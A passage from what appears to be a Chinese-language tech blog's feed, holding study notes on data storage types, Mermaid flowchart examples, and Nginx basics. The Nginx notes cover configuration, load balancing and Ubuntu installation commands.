    <content type="html"><![CDATA[<h3 id="1-数据存储类型图"><a href="#1-数据存储类型图" class="headerlink" title="1. 数据存储类型图"></a>1. 数据存储类型图</h3><p><img src="/source/_posts/%E7%AC%94%E8%AE%B0%EF%BC%9A%E6%95%B0%E6%8D%AE%E7%9A%84%E7%BB%84%E7%BB%87%E6%96%B9%E5%BC%8F%E7%B1%BB%E5%9E%8B/image-20250323142236244.png"></p><hr><h3 id="2-存储类型概述"><a href="#2-存储类型概述" class="headerlink" title="2. 存储类型概述"></a>2. 存储类型概述</h3><ol><li>&#x3D;&#x3D;内存存储&#x3D;&#x3D;<ol><li>数据直接存储于内存（RAM），读写速度达纳秒级，性能远超其他存储类型</li><li>由于数据存放于易失性内存中，一旦断电或系统崩溃，数据会立即丢失，适用于临时数据存储，不适合持久化存储。</li><li>常见实现包括 Redis、Memcached 等内存数据库</li></ol></li><li>&#x3D;&#x3D;块存储&#x3D;&#x3D;<ol><li>数据以固定大小的块（通常 4KB 至 64KB）存储，每个块通过唯一的地址（如 LBA）进行访问，支持高并发随机读写，适合数据库、虚拟机磁盘等应用场景。</li><li>计算机中的 HDD（机械硬盘）、SSD（固态硬盘）、U 盘，甚至云硬盘（如 AWS EBS）都是块存储的实例</li><li>块存储本质上是“生硬盘”，本身不具备文件系统的能力。因此，必须通过以下方式告知操作系统如何管理存储块：<ol><li><font color="#00b0f0">直接读写存储块</font>：<ol><li>通常需要专业的开发技能，如内核开发，一般用户不需要这样做</li></ol></li><li><font color="#00b0f0">格式化为文件系统</font>：<ol><li>需要先将块存储格式化为文件系统（如 NTFS、ext4、XFS 等），才能用来管理文件</li><li>块存储可以格式化为文件存储，但文件存储无法直接变回块存储</li></ol></li></ol></li><li>需要注意的是：格式化之后必须挂载到某个目录，操作系统和应用（比如 MinIO）才能使用它。<ol><li>我们可以将整块磁盘格式化后，挂载到指定目录。</li><li>也可以先把磁盘分成多个分区，只格式化其中某个分区，并将它挂载到指定目录</li></ol></li></ol></li><li>&#x3D;&#x3D;文件系统&#x3D;&#x3D;<ol><li>文件系统通常构建在块存储之上，将原始的块设备转化为目录树结构，提供文件、权限和元数据管理</li></ol></li><li>&#x3D;&#x3D;文件存储&#x3D;&#x3D;<ol><li>文件存储是基于文件系统的，以目录和文件的形式组织数据，符合用户直觉（如 <code>/data/images/cat.jpg</code>）</li></ol></li><li>&#x3D;&#x3D;对象存储&#x3D;&#x3D;<ol><li>对象存储也是基于文件系统的，数据以对象（Object）形式存储，每个对象包含数据、元数据和一个全局唯一的 ID（如 <code>s3://bucket/photo.jpg</code>）</li><li>通过 RESTful API（如 <code>PUT /bucket/object</code>）进行操作，没有目录层级的概念</li></ol></li><li>&#x3D;&#x3D;数据库存储&#x3D;&#x3D;<ol><li>数据库存储按关系型（SQL）或非关系型（NoSQL）模型组织数据</li><li>数据库存储可以基于文件系统，也可以直接操作块存储，但直接操作块存储较为少见，通常只有在需要深度定制存储引擎时才会采用</li></ol></li><li>&#x3D;&#x3D;分布式存储&#x3D;&#x3D;<ol><li>数据通过分片存储于不同节点，支持横向扩展，能够处理 PB 级别的数据存储需求</li></ol></li></ol><hr>]]></content>
    
    
    <categories>
      
      <category>数据管理</category>
      
      <category>数据的组织方式</category>
      
      <category>数据的组织方式类型</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Anycast</title>
    <link href="/2025/03/20/%E7%AC%94%E8%AE%B0%EF%BC%9AAnycast/"/>
    <url>/2025/03/20/%E7%AC%94%E8%AE%B0%EF%BC%9AAnycast/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>网络相关</category>
      
      <category>Anycast</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Mermaid</title>
    <link href="/2025/03/19/%E7%AC%94%E8%AE%B0%EF%BC%9AMermaid/"/>
    <url>/2025/03/19/%E7%AC%94%E8%AE%B0%EF%BC%9AMermaid/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ocaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs ocaml">graph <span class="hljs-type">TD</span><br>    subgraph 客户端<br>    <span class="hljs-type">A</span>[用户请求] --&gt;|<span class="hljs-string">&quot;DNS 解析&quot;</span>| <span class="hljs-type">B</span>[<span class="hljs-string">&quot;NGINX&quot;</span>]<br>    <span class="hljs-keyword">end</span><br><br>    subgraph 前端<br>    <span class="hljs-type">B</span> --&gt; <span class="hljs-type">C</span>[<span class="hljs-string">&quot;NGINX1(主)&quot;</span>]<br>    <span class="hljs-type">B</span> --&gt; <span class="hljs-type">D</span>[<span class="hljs-string">&quot;NGINX2&quot;</span>]<br>    <span class="hljs-type">B</span> --&gt; <span class="hljs-type">E</span>[<span class="hljs-string">&quot;NGINX3&quot;</span>]<br>    <span class="hljs-keyword">end</span><br><br>    subgraph 后端<br>    <span class="hljs-type">C</span> --&gt; <span class="hljs-type">F</span>[<span class="hljs-string">&quot;Redis集群&quot;</span>]<br>    <span class="hljs-type">D</span> --&gt; <span class="hljs-type">F</span>[<span class="hljs-string">&quot;Redis集群&quot;</span>]<br>    <span class="hljs-type">E</span> --&gt; <span class="hljs-type">F</span>[<span class="hljs-string">&quot;Redis集群&quot;</span>]<br>    <span class="hljs-type">F</span> --&gt; <span class="hljs-type">G</span>[<span class="hljs-string">&quot;Redis1(主)&quot;</span>]<br>    <span class="hljs-type">F</span> --&gt; <span class="hljs-type">H</span>[<span class="hljs-string">&quot;Redis2&quot;</span>]<br><br>    <span class="hljs-type">C</span> --&gt; <span class="hljs-type">I</span>[<span class="hljs-string">&quot;Kafka集群&quot;</span>]<br>    <span class="hljs-type">D</span> --&gt; <span class="hljs-type">I</span>[<span class="hljs-string">&quot;Kafka集群&quot;</span>]<br>    <span class="hljs-type">E</span> --&gt; <span class="hljs-type">I</span>[<span class="hljs-string">&quot;Kafka集群&quot;</span>]<br>    <br>    <span class="hljs-type">I</span> --&gt; <span class="hljs-type">J</span>[<span class="hljs-string">&quot;Kafka1(主)&quot;</span>]<br>    <span class="hljs-type">I</span> --&gt; <span class="hljs-type">K</span>[<span class="hljs-string">&quot;Kafka2&quot;</span>]<br>    <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><pre class="mermaid">graph TD    subgraph 客户端        A[用户请求] -->|"DNS 解析"| B["NGINX"]    end    subgraph 前端        B --> C["NGINX1(主)"]        B --> D["NGINX2"]        B --> E["NGINX3"]    end    subgraph 后端        C --> F["Redis集群"]        D --> F["Redis集群"]        E --> F["Redis集群"]        F --> G["Redis1(主)"]        F --> H["Redis2"]            C --> I["Kafka集群"]        D --> I["Kafka集群"]        E --> I["Kafka集群"]                I --> J["Kafka1(主)"]        I --> K["Kafka2"]    end</pre><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">graph</span> TD<br>    <span class="hljs-attribute">A</span>[(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)] --&gt;|选物品<span class="hljs-number">1</span>| B[(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)]<br>    <span class="hljs-attribute">A</span> --&gt;|不选物品<span class="hljs-number">1</span>| C[(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)]<br>    <span class="hljs-attribute">B</span> --&gt;|选物品<span class="hljs-number">2</span>| D[(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)]<br>    <span class="hljs-attribute">B</span> --&gt;|不选物品<span class="hljs-number">2</span>| E[(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)]<br>    <span class="hljs-attribute">C</span> --&gt;|选物品<span class="hljs-number">2</span>| F[(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)]<br>    <span class="hljs-attribute">C</span> --&gt;|不选物品<span class="hljs-number">2</span>| G[(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)]<br>    <span class="hljs-attribute">D</span> --&gt;|选物品<span class="hljs-number">3</span>| H[(<span class="hljs-number">9</span>,<span class="hljs-number">14</span>)]<br>    <span class="hljs-attribute">D</span> --&gt;|不选物品<span class="hljs-number">3</span>| I[(<span class="hljs-number">5</span>,<span class="hljs-number">7</span>)]<br>    <span class="hljs-attribute">E</span> --&gt;|选物品<span class="hljs-number">3</span>| J[(<span class="hljs-number">6</span>,<span class="hljs-number">10</span>)]<br>    <span class="hljs-attribute">E</span> --&gt;|不选物品<span class="hljs-number">3</span>| K[(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)]<br>    <span class="hljs-attribute">F</span> --&gt;|选物品<span class="hljs-number">3</span>| L[(<span class="hljs-number">7</span>,<span class="hljs-number">11</span>)]<br>    <span class="hljs-attribute">F</span> --&gt;|不选物品<span class="hljs-number">3</span>| M[(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)]<br>    <span class="hljs-attribute">G</span> --&gt;|选物品<span class="hljs-number">3</span>| N[(<span class="hljs-number">4</span>,<span class="hljs-number">7</span>)]<br>    <span class="hljs-attribute">G</span> --&gt;|不选物品<span class="hljs-number">3</span>| O[(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)]<br><br></code></pre></td></tr></table></figure><p><img src="/2025/03/19/%E7%AC%94%E8%AE%B0%EF%BC%9AMermaid/image-20250423144408338.png"></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">graph TD<br>    A((<span class="hljs-name">Start</span>)) --&gt; B((<span class="hljs-name">Process</span>))<br><br></code></pre></td></tr></table></figure><pre class="mermaid">graph TD    A((Start)) --> B((Process))</pre><pre class="mermaid">graph TD    A((0,0)) -->|x1 = 1| B((5,4))    A -->|x1 = 0| C((0,0))    B -->|x2 = 1| D((8,8))    B -->|x2 = 0| E((5,4))    C -->|x2 = 1| F((3,4))    C -->|x2 = 0| G((0,0))    D -->|x3 = 1| H((10,11))    D -->|x3 = 0| I((8,8))    E -->|x3 = 1| J((7,7))    E -->|x3 = 0| K((5,4))    F -->|x3 = 1| L((5,7))    F -->|x3 = 0| M((3,4))    G -->|x3 = 1| N((2,3))    G -->|x3 = 0| O((0,0))    H -->|x4 = 1| P((11,12))    H -->|x4 = 0| Q((10,11))    I -->|x4 = 1| R((9,9))    I -->|x4 = 0| S((8,8))    J -->|x4 = 1| T((8,8))    J -->|x4 = 0| U((7,7))    K -->|x4 = 1| V((6,5))    K -->|x4 = 0| W((5,4))    L -->|x4 = 1| X((6,8))    L -->|x4 = 0| Y((5,7))    M -->|x4 = 1| Z((4,5))    M -->|x4 = 0| AA((3,4))    N -->|x4 = 1| AB((3,4))    N -->|x4 = 0| AC((2,3))    O -->|x4 = 1| AD((1,1))    O -->|x4 = 0| AE((0,0))</pre>]]></content>
    
    
    <categories>
      
      <category>流程图</category>
      
      <category>Mermaid</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>笔记：Nginx 基础</title>
    <link href="/2025/03/19/%E7%AC%94%E8%AE%B0%EF%BC%9ANginx%20%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/03/19/%E7%AC%94%E8%AE%B0%EF%BC%9ANginx%20%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、理论"><a href="#一、理论" class="headerlink" title="一、理论"></a>一、理论</h1><h3 id="1-导图：Map：Nginx"><a href="#1-导图：Map：Nginx" class="headerlink" title="1. 导图：Map：Nginx"></a>1. 导图：<a href="Map%EF%BC%9ANginx.xmind">Map：Nginx</a></h3><hr><h3 id="2-Nginx-概述"><a href="#2-Nginx-概述" class="headerlink" title="2. Nginx 概述"></a>2. Nginx 概述</h3><p>Nginx 是一款开源的、高性能的 HTTP 服务器，我们常使用 Nginx 作为负载均衡服务器或反向代理服务器。</p><hr><h3 id="3-Nginx-最佳实战"><a href="#3-Nginx-最佳实战" class="headerlink" title="3. Nginx 最佳实战"></a>3. Nginx 最佳实战</h3><ol><li>&#x3D;&#x3D;主从&#x3D;&#x3D;：<ol><li>Nginx <strong>无主从概念</strong>，每个 Nginx 都是独立的单体实例，我们需要分别配置其配置文件</li><li><font color="#00b0f0">Nginx 核心组件</font>：<br> 1. <font color="#7030a0">Master 进程</font>：<br>     1. 负责管理 Worker 进程，执行配置文件加载、信号管理（如启动、停止、重载等）<br> 2. <font color="#7030a0">Worker 进程</font>：<br>     1. 负责实际处理 HTTP 请求，如接收连接、解析请求、读取文件、反向代理、返回响应等<br>     2. Worker 进程可以有多个，以提高并发处理能力</li></ol></li><li>&#x3D;&#x3D;高可用&#x3D;&#x3D;：<ol><li>Nginx 本身<strong>不具备自动故障转移能力</strong>，高可用通常依赖以下方案：</li><li>部署多实例 Nginx</li><li>使用 Keepalived 负责检测 Nginx 节点健康状况，若检测到 Nginx 不健康，则将 VIP 漂移到其他健康 Nginx 节点，保证请求不中断。</li></ol></li><li>&#x3D;&#x3D;最佳实战&#x3D;&#x3D;：<ol><li>关于 Nginx 的最佳实战是：<font color="#ff0000">别再用传统 Nginx 集群了！直接使用 K8s NGINX Ingress Controller 替代！</font>此处仅以单个 Nginx 为示例进行演示。</li><li>传统的 Nginx 集群的痛点：<ol><li><font color="#00b0f0">配置复杂</font>：<ol><li>每个 Nginx 节点都需要手动配置，修改配置后还需重启或重新加载，运维成本高</li></ol></li><li><font color="#00b0f0">健康检查问题</font>：<ol><li>在健康检查中，Nginx 若检测到某个节点故障，将停止向该节点发送请求。</li><li>但是Nginx 社区版没有主动健康检查，只有被动健康检查，被动健康检查无法预防故障，只能在请求失败后检测出问题，延迟较大。</li></ol></li><li><font color="#00b0f0">扩展性不足</font>：<ol><li>传统集群难以实现动态扩容，增加节点时不仅需要手动配置，还需要重新调整负载均衡</li></ol></li><li><font color="#00b0f0">证书管理麻烦</font><ol><li>证书申请与部署需要手动操作，更新证书时还必须重新加载 Nginx</li></ol></li></ol></li><li>在容器化场景下，使用 K8s 的 Nginx Ingress Controller 完全可以代替传统的 NGINX 集群，并且它更适合容器化架构，其优点是：<ol><li><font color="#00b0f0">简化配置</font>：<ol><li>通过声明式 <code>Ingress</code> 资源定义访问规则，只需更新 YAML 文件即可修改规则，<strong>无需重启或重新加载 Nginx</strong></li></ol></li><li><font color="#00b0f0">高可用性</font>：<ol><li>利用 K8s 的 Liveness&#x2F;Readiness 探针主动检测 Nginx 的健康状况，不健康的实例会自动被移除出流量池，确保请求始终分发到健康节点</li></ol></li><li><font color="#00b0f0">出色的扩展性</font>：<ol><li>通过 K8s 可灵活调整 Nginx Ingress Controller 的 Pod 数量，结合水平自动扩展（HPA），轻松实现扩容；</li><li>同时，K8s支持多种插件和自定义扩展（如重写、限流、认证等），比传统 NGINX 更具灵活性</li></ol></li><li><font color="#00b0f0">证书自动管理</font>：<ol><li>配合 cert-manager，实现 HTTPS 证书的自动申请、管理与续期，彻底简化证书更新流程，无需人工干预</li></ol></li></ol></li></ol></li></ol><hr><h3 id="4-Nginx-相关命令"><a href="#4-Nginx-相关命令" class="headerlink" title="4. Nginx 相关命令"></a>4. Nginx 相关命令</h3><p>使用这些命令的前提是要先进入 Nginx 的安装目录：<code>cd /usr/local/nginx/sbin</code></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 查看 nginx 版本号</span><br><span class="hljs-string">./nginx</span> -v<br><br><span class="hljs-comment"># 查看 nginx 状态</span><br>ps -ef|grep nginx<br><br><span class="hljs-comment"># 启动 nginx</span><br><span class="hljs-string">./nginx</span><br><br><span class="hljs-comment"># 停止 nginx</span><br><span class="hljs-string">./nginx</span> -s stop<br><br><span class="hljs-comment"># 重新加载 nginx</span><br><span class="hljs-string">./nginx</span> -s <span class="hljs-keyword">reload</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-Nginx-配置文件研究"><a href="#5-Nginx-配置文件研究" class="headerlink" title="5. Nginx 配置文件研究"></a>5. Nginx 配置文件研究</h3><p>Nginx 配置文件的位置：<code>/usr/local/nginx/conf/nginx.conf</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># --------------------------------- 全局块 -------------------------------------</span><br><span class="hljs-attribute">user</span>  nobody;                                          <span class="hljs-comment"># 设置 Worker 进程运行的用户</span><br><br><span class="hljs-attribute">worker_processes</span>  <span class="hljs-number">1</span>;                                   <span class="hljs-comment"># 设置 Worker 进程的数量，建议与 CPU 核心数一致</span><br><br><span class="hljs-attribute">error_log</span>  logs/<span class="hljs-literal">error</span>.log <span class="hljs-literal">error</span>;                       <span class="hljs-comment"># 记录错误日志，级别是 error</span><br><br><span class="hljs-attribute">pid</span>        logs/nginx.pid;                             <span class="hljs-comment"># 存储 master 进程的 ID 的文件</span><br><br><br><span class="hljs-comment"># -------------------------------- events 块 ------------------------------------</span><br><span class="hljs-section">events</span> &#123;<br>    <span class="hljs-attribute">worker_connections</span>  <span class="hljs-number">1024</span>;                          <span class="hljs-comment"># 每个 worker 进程最大并发连接数（根据系统优化）</span><br>&#125;<br><br><br><span class="hljs-comment"># --------------------------------- http 块 --------------------------------------</span><br><span class="hljs-comment"># 被反向代理的服务器，同时设置了负载均衡</span><br><span class="hljs-section">upstream</span> myserver &#123;                                     <br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.29.134:8080</span> weight=<span class="hljs-number">4</span>;<br>    <span class="hljs-attribute">server</span> <span class="hljs-number">192.168.29.134:8081</span> weight=<span class="hljs-number">2</span>;<br>&#125;<br><br><br><span class="hljs-comment"># 将 HTTP 请求（端口 80）重定向到 HTTPS（端口 443）</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;                                          <span class="hljs-comment"># 监听端口 80（IPv4）</span><br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">80</span>;                                     <span class="hljs-comment"># 监听端口 80（IPv6）</span><br>    <span class="hljs-attribute">server_name</span> <span class="hljs-number">192.168.17.129</span>;                         <span class="hljs-comment"># 代理服务器 IP（Nginx 服务器 IP）</span><br>    <span class="hljs-attribute">return</span> <span class="hljs-number">301</span> https://<span class="hljs-variable">$host</span><span class="hljs-variable">$request_uri</span>;               <span class="hljs-comment"># HTTP -&gt; HTTPS</span><br>&#125;<br><br><br><span class="hljs-comment"># 监听 HTTPS（端口 443）</span><br><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;                                     <span class="hljs-comment"># 启用 SSL 支持，监听端口 443（IPv4）</span><br>    <span class="hljs-attribute">listen</span> [::]:<span class="hljs-number">443</span> ssl;                                <span class="hljs-comment"># 启用 SSL 支持，监听端口 443（IPv6）</span><br>    <span class="hljs-attribute">server_name</span> <span class="hljs-number">192.168.17.129</span>;                         <span class="hljs-comment"># 代理服务器 IP（Nginx 服务器 IP）</span><br> <br>    <span class="hljs-attribute">ssl_certificate</span> /etc/nginx/ssl/example.com.crt;     <span class="hljs-comment"># 指定 HTTPS 证书文件</span><br>    <span class="hljs-attribute">ssl_certificate_key</span> /etc/nginx/ssl/example.com.key; <span class="hljs-comment"># 指定 HTTPS 证书私钥文件</span><br><br>    <span class="hljs-attribute">ssl_protocols</span> TLSv1.<span class="hljs-number">2</span> TLSv1.<span class="hljs-number">3</span>;                      <span class="hljs-comment"># 启用 TLS 协议</span><br>    <br>    <span class="hljs-attribute">ssl_ciphers</span> <span class="hljs-string">&#x27;TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256&#x27;</span>;                                 <span class="hljs-comment"># 推荐的加密套件</span><br>    <br>    <span class="hljs-attribute">ssl_prefer_server_ciphers</span> <span class="hljs-literal">on</span>;                       <span class="hljs-comment"># 强制使用服务器的加密套件</span><br><br>    <span class="hljs-attribute">ssl_session_cache</span> shared:SSL:<span class="hljs-number">10m</span>;                   <span class="hljs-comment"># SSL 会话缓存大小，这里是 10 MB</span><br>    <span class="hljs-attribute">ssl_session_timeout</span> <span class="hljs-number">1d</span>;                             <span class="hljs-comment"># 会话超时时间，推荐 10m ~ 1d</span><br>    <span class="hljs-attribute">ssl_stapling</span> <span class="hljs-literal">on</span>;                                    <span class="hljs-comment"># 启用 OCSP stapling</span><br>    <span class="hljs-attribute">ssl_stapling_verify</span> <span class="hljs-literal">on</span>;                             <span class="hljs-comment"># 启用 OCSP stapling 验证</span><br><br>    <span class="hljs-section">location</span> / &#123;<br>        <span class="hljs-attribute">proxy_pass</span> http://myserver; <br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><ol><li><code>user</code>：<ol><li>设置 <code>Worker</code> 进程运行的用户，常见选择为：</li><li><font color="#00b0f0">nobody</font>：<ol><li>低权限用户，通常用于运行不需要访问敏感系统资源的服务</li></ol></li><li><font color="#00b0f0">nginx（自定义用户）</font>：<ol><li>通常情况下，我们会创建一个 nginx 用户，授予其一定权限，在 Master 进程上使用 root ，在 worker 进程上使用 nginx</li></ol></li></ol></li><li><code>worker_processes</code>：<ol><li>指定了 Nginx 的 Worker 进程数量，建议设置为主机 CPU 的核心数，常见值有：</li><li><font color="#00b0f0">auto</font>：<ol><li>让 Nginx 自动检测 CPU 核心数（Nginx 1.11.3+ 支持）</li></ol></li><li><font color="#00b0f0">int（自定义数量）</font>：<ol><li>与主机 CPU 核心数一致</li></ol></li></ol></li><li><code>error_log</code>：<ol><li>记录错误的日志，可选日志级别有：</li><li><font color="#00b0f0">error</font></li><li><font color="#00b0f0">notice</font></li><li><font color="#00b0f0">info</font></li></ol></li><li><code>server_name</code>：<ol><li>指定当前 Nginx 主机的<strong>域名或 IP</strong></li><li>在这个配置中，你也可以有多个值，多个值之间用空格隔开</li></ol></li></ol><blockquote><p>[!NOTE] 注意事项</p><ol><li>在实际开发中，避免将 IP 硬编码在配置文件中，建议通过 BIND DNS 使用域名解析的方式进行管理。</li><li>在监听 HTTPS 端口时，尽管配置中使用的是 <code>ssl</code> 参数来启用加密，但实际上开启的是 TLS 支持。这是由于历史原因遗留下来的命名习惯</li></ol></blockquote><hr><h3 id="6-Nginx-负载均衡策略"><a href="#6-Nginx-负载均衡策略" class="headerlink" title="6. Nginx 负载均衡策略"></a>6. Nginx 负载均衡策略</h3><p>&#x3D;&#x3D;1.轮询（默认）&#x3D;&#x3D;<br>每个请求按时间顺序逐一分配到不同的后端服务器，如果某台服务器挂掉，能自动剔除。</p><p>2.&#x3D;&#x3D;weight&#x3D;&#x3D;<br>weight 代表权重，默认权重为 1，权重越高被分配的客户端越多</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">upstream myserver &#123;<br>   <span class="hljs-built_in"> server </span>192.168.29.134:8080 <span class="hljs-attribute">weight</span>=4;<br>   <span class="hljs-built_in"> server </span>192.168.29.134:8081 <span class="hljs-attribute">weight</span>=2;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;3.ip_hash&#x3D;&#x3D;<br>每个请求按访问 ip 的 hash 结果分配，这样每个访客固定访问一个后端服务器</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">upstream myserver &#123;<br><span class="hljs-attribute">ip_hash;</span><br><span class="hljs-attribute">    server 192.168.29.134</span>:8080;<br>    <span class="hljs-attribute">server 192.168.29.134</span>:8081;<br>&#125;<br></code></pre></td></tr></table></figure><p>&#x3D;&#x3D;4.fair&#x3D;&#x3D;<br>按后端服务器的响应时间来分配请求，响应时间短的优先分配</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs axapta">upstream myserver &#123;<br>    <span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.29</span><span class="hljs-number">.134</span>:<span class="hljs-number">8080</span>;<br>    <span class="hljs-keyword">server</span> <span class="hljs-number">192.168</span><span class="hljs-number">.29</span><span class="hljs-number">.134</span>:<span class="hljs-number">8081</span>;<br>    fair;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h1 id="二、实操"><a href="#二、实操" class="headerlink" title="二、实操"></a>二、实操</h1><h3 id="1-安装并启用-Nginx"><a href="#1-安装并启用-Nginx" class="headerlink" title="1. 安装并启用 Nginx"></a>1. 安装并启用 Nginx</h3><p>以下是基于 <code>Ubuntu</code> 系统安装并启用 <code>Nginx</code> 步骤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1. 安装 Nginx</span><br><span class="hljs-built_in">sudo</span> apt install nginx<br><br><br><span class="hljs-comment"># 2. 启动 Nginx 服务</span><br><span class="hljs-built_in">sudo</span> systemctl start nginx<br><br><br><span class="hljs-comment"># 3. 设置 Nginx 开机自启动</span><br><span class="hljs-built_in">sudo</span> systemctl <span class="hljs-built_in">enable</span> nginx<br><br><br><span class="hljs-comment"># 4. 查看 Nginx 状态</span><br><span class="hljs-built_in">sudo</span> systemctl status nginx<br><br><br><span class="hljs-comment"># 5. 开放 Nginx 端口（默认80，可按需求开发其他端口，如443等）</span><br><span class="hljs-built_in">sudo</span> ufw allow <span class="hljs-string">&#x27;Nginx HTTP&#x27;</span><br><br><br><span class="hljs-comment"># 6. 重新加载防火墙规则以使其生效</span><br><span class="hljs-built_in">sudo</span> ufw reload<br><br><br><span class="hljs-comment"># 7. 访问 Nginx</span><br>http://Nginx 服务器 IP<br></code></pre></td></tr></table></figure><hr><h3 id="2-配置-Nginx"><a href="#2-配置-Nginx" class="headerlink" title="2. 配置 Nginx"></a>2. 配置 Nginx</h3><p>根据上文 Nginx 配置文件研究，配置 Nginx</p><hr><h3 id="3-重加载-Nginx"><a href="#3-重加载-Nginx" class="headerlink" title="3. 重加载 Nginx"></a>3. 重加载 Nginx</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl reload nginx<br></code></pre></td></tr></table></figure><hr><h5 id="7-2-3-进行-Ipv6-反向代理与负载均衡"><a href="#7-2-3-进行-Ipv6-反向代理与负载均衡" class="headerlink" title="7.2.3. 进行 Ipv6 